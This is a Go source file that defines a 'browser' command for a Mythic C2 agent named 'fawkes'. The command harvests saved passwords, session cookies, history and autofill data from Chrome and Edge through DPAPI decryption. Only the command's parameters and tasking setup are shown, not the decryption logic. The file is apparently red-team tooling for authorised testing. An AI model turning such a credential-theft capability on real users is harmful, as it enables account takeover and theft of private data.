package agentfunctions

import (
	"fmt"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "browser",
		Description:         "Harvest saved credentials, cookies, history, autofill data, and bookmarks from Chromium-based browsers (Chrome, Edge) via DPAPI + AES-GCM decryption (T1555.003, T1217)",
		HelpString:          "browser [-action <passwords|cookies|history|autofill|bookmarks>] [-browser <all|chrome|edge>]",
		Version:             2,
		SupportedUIFeatures: []string{},
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1555.003", "T1217"},
		ScriptOnlyCommand:   false,
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				ModalDisplayName: "Action",
				CLIName:          "action",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"passwords", "cookies", "history", "autofill", "bookmarks"},
				Description:      "What to harvest: passwords (saved logins), cookies (session tokens), history (browsing URLs), autofill (form data), or bookmarks (saved URLs).",
				DefaultValue:     "passwords",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "browser",
				ModalDisplayName: "Browser",
				CLIName:          "browser",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"all", "chrome", "edge"},
				Description:      "Which browser to target. 'all' checks both Chrome and Edge.",
				DefaultValue:     "all",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
		},
		AssociatedBrowserScript: nil,
		TaskFunctionOPSECPre:    nil,
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			browser, _ := taskData.Args.GetStringArg("browser")
			if browser == "" {
				browser = "all"
			}
			action, _ := taskData.Args.GetStringArg("action")
			if action == "" {
				action = "passwords"
			}
			display := fmt.Sprintf("%s %s", action, browser)
			response.DisplayParams = &display
			createArtifact(taskData.Task.ID, "File Read", fmt.Sprintf("Browser %s database access — %s", action, browser))
			return response
		},
		TaskFunctionProcessResponse: nil,
	})
}
